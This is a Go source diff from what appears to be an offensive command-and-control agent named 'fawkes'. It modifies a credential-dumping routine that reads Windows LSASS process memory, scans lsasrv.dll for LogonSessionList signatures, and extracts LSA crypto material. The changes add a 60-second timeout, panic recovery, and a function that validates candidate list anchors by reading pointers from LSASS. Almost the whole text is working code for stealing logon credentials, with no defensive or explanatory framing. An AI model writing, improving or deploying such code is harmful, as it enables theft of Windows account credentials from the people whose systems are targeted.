@@ -12,6 +12,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
+	"time"
 
 	"fawkes/pkg/structs"
 
@@ -29,8 +30,31 @@ func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
 }
 
 // executeInsituFull runs the full Phase 2B credential-discovery flow and
-// returns a structured CommandResult.
+// returns a structured CommandResult. The operation runs with a 60-second
+// timeout to prevent the agent from hanging if LSASS reads block.
 func executeInsituFull() structs.CommandResult {
+	type result struct {
+		cr structs.CommandResult
+	}
+	ch := make(chan result, 1)
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				ch <- result{cr: errorf("Phase 2B: panic: %v", r)}
+			}
+		}()
+		ch <- result{cr: executeInsituFullInner()}
+	}()
+
+	select {
+	case r := <-ch:
+		return r.cr
+	case <-time.After(60 * time.Second):
+		return errorf("Phase 2B: operation timed out after 60s (likely hung on ReadProcessMemory)")
+	}
+}
+
+func executeInsituFullInner() structs.CommandResult {
 	phase1, err := enumerateInsituSessions()
 	if err != nil {
 		return errorf("Phase 1 LSA enumeration failed: %v", err)
@@ -69,13 +93,14 @@ func executeInsituFull() structs.CommandResult {
 	if err != nil {
 		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
 	}
-	anchor, sigVariant, err := findLogonSessionListAnchorMulti(lsasrvBytes, mod.Base)
+
+	reader := lsassRemoteReader{h: h}
+
+	anchor, sigVariant, err := findValidatedAnchor(lsasrvBytes, mod.Base, reader)
 	if err != nil {
 		return errorf("Phase 2B: %v", err)
 	}
 	_ = sigVariant
-
-	reader := lsassRemoteReader{h: h}
 	var cryptoReport *insituFullCryptoReport
 	var cryptoMaterial lsaCryptoMaterial
 	var cryptoErrStr string
@@ -321,4 +346,51 @@ func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
 		return 0
 	}
 	return r.CbSecret
+}
+
+// findValidatedAnchor tries each LogonSessionList signature variant, resolves
+// the candidate anchor address, then validates it by reading the LIST_ENTRY
+// from LSASS and checking that the pointers look reasonable. This prevents
+// false-positive pattern matches from producing bad anchors that hang the walk.
+func findValidatedAnchor(lsasrvBytes []byte, lsasrvBase uintptr, reader lsassReader) (uintptr, string, error) {
+	var diag []string
+	for _, v := range logonSessionListVariants {
+		pat, mask, err := parseHexPattern(v.Signature)
+		if err != nil {
+			diag = append(diag, fmt.Sprintf("%s: bad pattern: %v", v.Name, err))
+			continue
+		}
+		hit := findPattern(lsasrvBytes, pat, mask)
+		if hit < 0 {
+			continue
+		}
+		movStart := hit + v.MovInstrOffset
+		if movStart < 0 || movStart+v.MovInstrLen > len(lsasrvBytes) {
+			diag = append(diag, fmt.Sprintf("%s: MOV outside buffer", v.Name))
+			continue
+		}
+		target, _, ok := resolveRIPRelative(lsasrvBytes, movStart, v.MovDispFieldOffs, v.MovInstrLen)
+		if !ok {
+			diag = append(diag, fmt.Sprintf("%s: RIP target outside buffer", v.Name))
+			continue
+		}
+		candidate := lsasrvBase + uintptr(target)
+
+		head, err := readListEntry(reader, candidate)
+		if err != nil {
+			diag = append(diag, fmt.Sprintf("%s: anchor 0x%X unreadable: %v", v.Name, candidate, err))
+			continue
+		}
+		if !isPlausibleUserModePtr(head.Flink) || !isPlausibleUserModePtr(head.Blink) {
+			diag = append(diag, fmt.Sprintf("%s: anchor 0x%X has bad pointers (Flink=0x%X Blink=0x%X)", v.Name, candidate, head.Flink, head.Blink))
+			continue
+		}
+		return candidate, v.Name, nil
+	}
+	return 0, "", fmt.Errorf("LogonSessionList: no variant produced a valid anchor in %d-byte lsasrv.dll (%d variants tried); diagnostics: %s",
+		len(lsasrvBytes), len(logonSessionListVariants), strings.Join(diag, "; "))
+}
+
+func isPlausibleUserModePtr(addr uintptr) bool {
+	return addr >= 0x10000 && addr < 0x7FFFFFFFFFFF
 }
